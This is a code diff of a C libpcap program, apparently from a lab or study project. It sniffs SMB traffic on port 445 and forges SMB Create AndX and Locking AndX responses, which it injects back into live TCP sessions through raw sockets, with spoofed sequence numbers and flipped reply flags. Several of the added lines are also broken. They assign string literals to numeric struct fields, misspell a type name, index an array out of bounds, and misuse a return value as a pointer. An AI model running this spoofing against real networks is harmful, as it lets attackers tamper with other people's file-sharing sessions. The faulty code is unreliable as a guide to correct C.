@@ -275,9 +275,9 @@ struct sniff_tcp {
 /* SMB header */
 struct sniff_smb {
 	u_int   smb_nb;			/* netbios */
-	u_int   smb_sc;			/* server component */
+	u_char  smb_sc[4];			/* server component */
 	u_char  smb_cmd;		/* smb command */
-	u_int   smb_stat;		/* nt status */
+	u_char  smb_stat[4];		/* nt status */
 	u_char  smb_flg;		/* header flags */
 	#define SMB_LAR 0x01
 	#define SMB_RBP 0x02
@@ -300,7 +300,7 @@ struct sniff_smb {
         #define SMB_ECT 0x0400
         #define SMB_US  0x0800
 	u_short smb_pidh;		/* process id high */
-	u_long  smb_sig;		/* signature */
+	u_char  smb_sig[8];		/* signature */
 	u_short smb_rsv;		/* reserved */
 	u_short smb_tid;		/* tree id */
         u_short smb_pid;                /* process id */
@@ -312,18 +312,18 @@ struct sniff_smb {
 
 /* SMB Create AndX Response */
 struct sniff_CAXR {
-	u_char  smb_wc;			/* word count */
-	u_char  smb_axc;                /* andxcommand */
-	u_char  smb_res;                /* reserved */
-	u_short smb_axo;		/* andxoffset */
-	u_char  smb_ol;                 /* oplock level */
-	u_short smb_fid;                /* fid */
-	u_int   smb_ca;			/* create action */
-	u_long  smb_c;			/* created */
-	u_long  smb_la;                 /* last access */
-	u_long  smb_lw;                 /* last write */
-	u_long  smb_ch;                 /* change */
-	u_int   smb_fa;			/* file attributes */
+	u_char  car_wc;			/* word count */
+	u_char  car_axc;                /* andxcommand */
+	u_char  car_res;                /* reserved */
+	u_short car_axo;		/* andxoffset */
+	u_char  car_ol;                 /* oplock level */
+	u_short car_fid;                /* fid */
+	u_int   car_ca;			/* create action */
+	u_long  car_c;			/* created */
+	u_long  car_la;                 /* last access */
+	u_long  car_lw;                 /* last write */
+	u_long  car_ch;                 /* change */
+	u_int   car_fa;			/* file attributes */
 	#define SMB_RO  0x00000001
 	#define SMB_HID 0x00000002
 	#define SMB_SYS 0x00000004
@@ -339,20 +339,26 @@ struct sniff_CAXR {
 	#define SMB_OFF 0x00001000
 	#define SMB_CON 0x00002000
 	#define SMB_ENC 0x00004000
-	u_long  smb_als;		/* allocation size */
-	u_long  smb_eof;                /* end of file */
-	u_short smb_ipc;		/* ipc state */
-	u_char  smb_isdir;		/* is directory */
-	u_long  smb_vguid1;             /* volume guid */
-	u_long  smb_vguid2;             /* volume guid */
-	u_long  smb_svrun;		/* server unique */
-	u_int   smb_mar;		/* maximal access rights */
-	u_int   smb_gmar;		/* guest maximal access rights */
-	u_short smb_bc;			/* byte count */
+	u_long  car_als;		/* allocation size */
+	u_long  car_eof;                /* end of file */
+	u_short car_ft;			/* file type */
+	u_short car_ipc;		/* ipc state */
+	u_char  car_isdir;		/* is directory */
+	u_char  car_vguid[16];		/* volume guid */
+	u_long  car_svrun;		/* server unique */
+	u_int   car_mar;		/* maximal access rights */
+	u_int   car_gmar;		/* guest maximal access rights */
+	u_short car_bc;			/* byte count */
 };
 
+u_short
+calc_fid(u_int sequence);
+
 void
-createAndXResponse(u_char *payload, int size_payload);
+lockingAndXResponse(u_char *payload, int size_payload);
+
+void
+createAndXResponse(u_char *payload, char *fid);
 
 void
 got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
@@ -498,6 +504,11 @@ print_payload(const u_char *payload, int len)
 return;
 }
 
+u_short calc_fid(u_int sequence)
+{
+	return sequence >> 16;
+}
+
 void send_raw_ip_packet(struct sniff_ip* ip)
 {
 	struct sockaddr_in dest_info;
@@ -518,15 +529,60 @@ void send_raw_ip_packet(struct sniff_ip* ip)
 	close(sock);
 }
 
-void createAndXResponse(u_char *payload, int size_payload)
+void lockingAndXResponse(u_char *payload, int size_payload)
 {
 	u_char *newpayload =
-		"\xa2"		// Word count
+		"\x08"		// Word count
+		"\xff"		// AndXCommand: No further commands
+		"\x00"		// Reserved
+		"\xde\xde"		// AndXOffset
+		"\x44\x44"		// FID
+		"\x13"		// Lock Type
+		"\x01"
+		"\xff\xff\xff\xff"		// Timeout
+		"\x00\x00"		// Number of unlocks
+		"\x00\x00"		// Number of locks
+		"\x00\x00"		// Byte count
+	;
+	memcpy(payload, newpayload, size_payload);
+}
+
+void createAndXResponse(u_char *payload, char *fid)
+{
+	struct sniff_CAXR *newpayload = (struct snif_CAXR*)payload;
+	
+	newpayload->car_wc = "\x2a";
+	newpayload->car_axc = "\xff";
+	newpayload->car_res = "\x00";
+	newpayload->car_axo = "\x87\x00";
+	newpayload->car_ol = "\x02"; 
+	newpayload->car_fid = "\x44\x44"; 
+	newpayload->car_ca = "\x01\x00\x00\x00";
+	newpayload->car_c = "\x3b\x87\x08\x2d\xa7\x7f\xd4\x01";
+	newpayload->car_la = "\x30\xa2\x63\x26\xb7\x7f\xd4\x01";
+	newpayload->car_lw = "\x46\x94\x86\xb5\xb6\x7f\xd4\x01" ;
+	newpayload->car_ch = "\x46\x94\x86\xb5\xb6\x7f\xd4\x01";
+	newpayload->car_fa = "\x20\x00\x00\x00";
+	newpayload->car_als = "\x00\x70\x00\x00\x00\x00\x00\x00";
+	newpayload->car_eof = "\x22\x6a\x00\x00\x00\x00\x00\x00";
+	newpayload->car_ft = "\x00\x00";
+	newpayload->car_ipc = "\x70\x00";
+	newpayload->car_isdir = "\x00";
+	newpayload->car_vguid[16] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+	newpayload->car_svrun = "\x00\x00\x00\x00\x00\x00\x00\x00";
+	newpayload->car_mar = "\xff\x01\x1f\x00";
+	newpayload->car_gmar = "\x00\x00\x00\x00";
+	newpayload->car_bc = "\x00\x00";
+
+
+	/*u_char *newpayload =
+		"\x2a"//"\xa2"		// Word count
 		"\xff"		// AndXCommand: No further commands
 		"\x00"		// Reserved
 		"\x87\x00"		// AndXOffset
 		"\x02"		// Oplock level: Batch oplock granted (2)
-		"\x44\x44"		// FID		
+		"\x44\x44"		// FID
+		
 		"\x01\x00\x00\x00"		// Create action
 		"\x3b\x87\x08\x2d\xa7\x7f\xd4\x01"		// Created
 		"\x30\xa2\x63\x26\xb7\x7f\xd4\x01"		// Last access
@@ -543,8 +599,8 @@ void createAndXResponse(u_char *payload, int size_payload)
 		"\xff\x01\x1f\x00"		// Maximal access rights
 		"\x00\x00\x00\x00"		// Guest maximal access rights
 		"\x00\x00"		// Byte count
-	;
-	memcpy(payload, newpayload, size_payload); 
+	;*/
+	memcpy(payload, newpayload, 103); 
 }
 	
 
@@ -629,7 +685,7 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	newtcp->th_seq = tcp->th_ack;
 	newtcp->th_ack = htonl(ntohl(tcp->th_seq) + tcp_seg_len);
 
-	printf("\nSMBSC: %x %x %x %x %x\n", smb->smb_nb, smb->smb_sc, smb->smb_cmd, smb->smb_flg, smb->smb_flg2);
+	newsmb->smb_flg = ((smb)->smb_flg ^ 0x80);
 
         //printf("\nMem location copy: %p %x %s\n", newip->ip_src, newip->ip_src, inet_ntoa(newip->ip_src));
         //printf("\nTCP Mem location copy: %p %x  %u\n", newtcp->th_sport, newtcp->th_sport, ntohs(newtcp->th_sport));
@@ -644,16 +700,24 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 	printf("\nOld seq: %u	New seq: %u\n", ntohl(tcp->th_seq), ntohl(newtcp->th_seq));
 	printf("Old ack: %u   New ack: %u\n", ntohl(tcp->th_ack), ntohl(newtcp->th_ack));
 
+	printf("\n Old smb flag: %x     New smb flag: %x\n", smb->smb_flg, newsmb->smb_flg);
+
 	printf("\nsmb_cmd: %x\n", smb->smb_cmd);
 	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_dport) == 445)
 	{
-		newsmb->smb_flg = (smb)->smb_flg;
-		printf("\nSMB Flag char: %x\n", newsmb->smb_flg);
-		createAndXResponse(newpayload, size_payload);
+		u_char* fid = calc_fid(newtcp->th_seq);
+		createAndXResponse(newpayload, *fid);
 		printf("\nNew Packet	Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
-		print_payload(newsmb, size_smb + size_payload);
+		print_payload(newip, size_ip + size_tcp + size_smb + 103);
 		send_raw_ip_packet(newip);
 	}
+	/*else if (smb->smb_cmd == 0x24 && ntohs(tcp->th_dport) == 445)
+	{
+		lockingAndXResponse(newpayload,19);
+		printf("\nNew Packet    Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
+		print_payload(newip, size_ip + size_tcp + size_smb + 19);
+		send_raw_ip_packet(newip);
+	}*/
 	if (smb->smb_cmd == 0xa2 && ntohs(tcp->th_sport) == 445)
 	{
 		printf("\nOld Packet	Size: %u\n", (size_ip + size_tcp + size_smb + size_payload));
